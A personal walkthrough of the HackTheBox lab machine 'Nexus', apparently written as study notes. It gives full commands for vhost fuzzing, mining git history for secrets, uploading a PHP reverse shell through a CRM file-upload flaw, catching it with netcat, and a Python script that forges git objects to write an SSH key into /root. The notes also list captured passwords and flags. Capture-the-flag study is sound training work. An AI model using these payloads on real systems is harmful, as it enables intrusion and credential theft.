---
platform: HTB
difficulty: Easy
ip: 10.129.46.29
os: Linux
status: rooted
date: 2026-07-08
tags: [box, linux, web, gitea, krayin, cve-2026-38526, directory-traversal, python]
---
# Nexus

> Easy Linux box. Path: public Gitea repo leaks a DB password → reused for Krayin CRM login → CVE-2026-38526 file-upload RCE (www-data) → creds in CRM `.env` reused for SSH (user `jones`) → root systemd timer running a template-sync script with an unsanitized `os.path.join()` directory traversal → write SSH key to `/root` → root.

## Overview
- Target: Ubuntu 24.04, nginx front-end doing name-based virtual hosting.
- Attack path: vhost enum → Gitea public repo (leaked DB password) → Krayin CRM (`j.matthew@nexus.htb` + leaked pass) → Arbitrary File Upload (CVE-2026-38526) → shell as `www-data` → password reuse → SSH as `jones` (user) → Directory Traversal via `os.path.join()` in a root-run Python sync script → SSH key into `/root/.ssh/authorized_keys` → root.
- Key theme: **nothing here was a memory-corruption exploit** — it was all leaked/reused credentials + one Python path-handling bug.

## Recon / Enumeration

### Nmap
```bash
export IP=10.129.46.29
# full TCP sweep, then service/version on what's open
nmap -p- --min-rate 5000 -T4 $IP -oN nexus_allports.txt
nmap -p 22,80 -sC -sV $IP -oN nexus_services.txt
```
Open ports:
- `22/tcp` OpenSSH 9.6p1 (Ubuntu) — current, not the way in.
- `80/tcp` nginx 1.24.0 — `http-title: Did not follow redirect to http://nexus.htb/`

The redirect to a hostname = name-based vhosting. Add it to hosts:
```bash
echo "10.129.46.29 nexus.htb" | sudo tee -a /etc/hosts
```

### Web (nexus.htb)
Static "Nexus Energy Authority" site. Pull it and mine for hints:
```bash
curl -s -D - http://nexus.htb/ -o nexus_index.html
grep -oE 'href="[^"]*"' nexus_index.html | sort -u
grep -iE 'mailto|portal|login|admin|api' nexus_index.html
```
Findings:
- Emails in the careers/job posting: `careers@nexus.htb` and **`j.matthew@nexus.htb`** (hiring manager → future CRM login).
- Static page, no dynamic function → pivot to subdomain/vhost enum.

### Vhost fuzzing
```bash
# non-existent vhosts redirect (302) back to nexus.htb — filter those out
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 302 -t 60
```
Live vhosts found: **`git.nexus.htb`** (Gitea) and **`billing.nexus.htb`** (Krayin CRM).
```bash
echo "10.129.46.29 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```
> Tip: filter by status/size/word count. Here `-fc 302` hid the redirect noise so only real vhosts printed.

## Foothold

### 1. Gitea — leaked credentials in a public repo
`git.nexus.htb` = Gitea **1.26.0**. The repo `admin/krayin-docker-setup` is **public** — no auth needed. Clone it and mine git history (secrets often live in old commits, not the current file):
```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git log -p --all | grep -iE 'password|secret|APP_KEY|token' | sort -u
```
An earlier commit exposed the DB password (the current `.env` had it blank):
```
DB_PASSWORD=N27xh!!2ucY04
```
`docker-compose.yml` also confirmed the app URL `http://billing.nexus.htb` and a Krayin/MySQL/phpMyAdmin stack.

> **Rabbit hole (avoided):** Gitea 1.26.0 has CVE-2026-20896 (`X-WEBAUTH-USER` reverse-proxy auth bypass), but reverse-proxy auth was **not enabled** here — the header did nothing. Test that an exploit actually authenticates (look for the `Sign In` link disappearing) before building on it. The repo was simply public.

### 2. Krayin CRM login (credential reuse)
`billing.nexus.htb` = Krayin CRM **2.2.0**. Login with the hiring-manager email + leaked DB password:
- Email: `j.matthew@nexus.htb`  (NOT `admin@nexus.htb` — that was my wrong first guess)
- Password: `N27xh!!2ucY04`

CLI login check (302 → `/admin/dashboard` = success):
```bash
curl -s -c cj.txt http://billing.nexus.htb/admin/login -o login.html
TOKEN=$(grep -oE 'name="_token"[^>]*value="[^"]+"' login.html | grep -oE 'value="[^"]+"' | cut -d'"' -f2)
curl -s -b cj.txt -c cj.txt -D - -o /dev/null \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=j.matthew@nexus.htb" \
  --data-urlencode 'password=N27xh!!2ucY04' \
  http://billing.nexus.htb/admin/login
```

### 3. CVE-2026-38526 — authenticated file-upload RCE
Krayin 2.2.x TinyMCE media endpoint `/admin/tinymce/upload` doesn't validate file type; files land in web-accessible `/storage/tinymce/`. Upload a PHP shell with an image content-type but a `.php` filename → GET it → code executes. See [[Arbitrary File Upload]].

```bash
# prep reverse shell
ip -4 addr show tun0 | grep -oP 'inet \K[0-9.]+'   # my VPN IP = 10.10.17.226
curl -s -o shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i "s/127.0.0.1/10.10.17.226/; s/1234/4455/" shell.php

# fresh CSRF token from an authenticated page
curl -s -b cj.txt -c cj.txt http://billing.nexus.htb/admin/dashboard -o dash.html
TOKEN=$(grep -oE 'name="_token"[^>]*value="[^"]+"' dash.html | grep -oE 'value="[^"]+"' | cut -d'"' -f2)

# upload: .php filename, image mime
curl -s -b cj.txt -c cj.txt \
  -F "_token=$TOKEN" \
  -F "file=@shell.php;filename=shell.php;type=image/png" \
  http://billing.nexus.htb/admin/tinymce/upload
# -> {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

Catch and trigger:
```bash
# firewall was blocking the callback! ufw only allowed 22 inbound:
sudo ufw allow 4455/tcp

# terminal 1
nc -lnvp 4455
# terminal 2
curl -s "http://billing.nexus.htb/storage/tinymce/<hash>.php"
```
Shell as `www-data`. Stabilize:
```bash
script /dev/null -c /bin/bash
# or: python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 4. Pivot to user `jones` (credential reuse again)
The **live** CRM `.env` had a different DB password than the git repo:
```bash
cat ~/krayin/.env | grep -iE 'DB_|PASSWORD'
# DB_PASSWORD=y27xb3ha!!74GbR
grep -E 'bash|sh$' /etc/passwd   # -> jones:...:/home/jones:/bin/bash
```
SSH in with the reused password:
```bash
ssh jones@10.129.46.29        # password: y27xb3ha!!74GbR
id                            # uid=1000(jones)
cat ~/user.txt                # USER FLAG
```

## Privilege Escalation

### Enumerate — root-run template sync timer
```bash
systemctl list-timers | grep -i template
cat /etc/gitea/template-sync.py
```
`gitea-template-sync.timer` fires ~every minute and runs `/etc/gitea/template-sync.py` as a privileged user. The script pulls all **template** repos from Gitea and writes each file to `/home/git/template-staging/<owner>/<repo>/`. The bug (see [[Directory Traversal]]):
```python
target = os.path.join(stage_path, filepath)   # filepath comes straight from `git ls-tree`, unsanitized
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, 'wb') as f: f.write(blob)
```
`os.path.join(base, "../../../../../root/.ssh/authorized_keys")` escapes `base`. Git normally blocks `..` in tree paths via `verify_path()`, so we **write raw git objects directly** to bypass that check.

**Depth:** `/home/git/template-staging/jones/rce/` → climb 5 dirs (`rce→jones→template-staging→git→home→/`) → **five `..`**.

### Exploit — Gitea template directory traversal
```bash
# on the box as jones
set +H                                   # disable bash history expansion (passwords contain !!)
ssh-keygen -t ed25519 -f /tmp/.k -N ''

# create a TEMPLATE repo via Gitea API (Gitea is on localhost:3000)
curl -s -u 'jones:y27xb3ha!!74GbR' -X POST "http://localhost:3000/api/v1/user/repos" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce","template":true,"auto_init":false}'

cd /tmp
git clone 'http://jones:y27xb3ha!!74GbR@localhost:3000/jones/rce.git'
cd rce
git config user.email x@x; git config user.name x
```

`build.py` — crafts raw git objects so the file path resolves to `../../../../../root/.ssh/authorized_keys`:
```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"; s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2]); os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p): open(p,"wb").write(zlib.compress(s))
    return sha
def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")   # .ssh/
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")                # root/ contents
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):                                               # 4x ..
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")  # 5th ..
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```
```bash
python3 /tmp/build.py
git push -u origin main --force
# (warnings about "../../../../../root/.gitattributes: Permission denied" CONFIRM the traversal resolves)
```

Wait for the timer, then SSH in as root:
```bash
tail -f /var/log/template-sync.log
# look for: synced: ../../../../../root/.ssh/authorized_keys
ssh -i /tmp/.k root@localhost
cat /root/root.txt            # ROOT FLAG
```

## Loot
- user flag: `1cc1694efa6fc53d1db123fdd60fbf7e`
- root flag: `218670d6c6821a7d991b986a330e2dfb`
- creds found:
  - `j.matthew@nexus.htb` : `N27xh!!2ucY04` (Krayin CRM login; leaked in Gitea repo git history)
  - `jones` : `y27xb3ha!!74GbR` (SSH; from live CRM `.env`)

## Techniques used
- Vhost Enumeration
- Git Secrets in Commit History
- Credential Reuse
- Arbitrary File Upload (CVE-2026-38526)
- Directory Traversal via unsanitized `os.path.join()`
- Raw Git Object Crafting (bypassing `verify_path()`)

## Lessons / what tripped me up
- **Verify an exploit actually works before committing to it.** Chased the Gitea `X-WEBAUTH-USER` bypass (CVE-2026-20896) and a phpMyAdmin hunt — both dead ends. The repo was just public. The tell: the page still showed the `Sign In` link, i.e. not authenticated.
- **Right email matters.** Login failed as `admin@nexus.htb`; the real account was `j.matthew@nexus.htb` from the job posting. Read the recon output carefully.
- **`!!` in passwords = shell history expansion.** Bit me twice (mangled the password). Fix: `set +H`, or single-quote anything containing `!`.
- **Check the local firewall for reverse shells.** `ufw` only allowed inbound 22, so the callback timed out until `ufw allow 4455/tcp`.
- **Always grep git *history*, not just the working tree.** The current `.env` had a blank password; the real one lived in an older commit.
- **Read the actual source on the box** (`template-sync.py`) to count the exact `..` depth instead of trusting a guess.

## Report notes
- Steps reproducible from notes alone: [x]
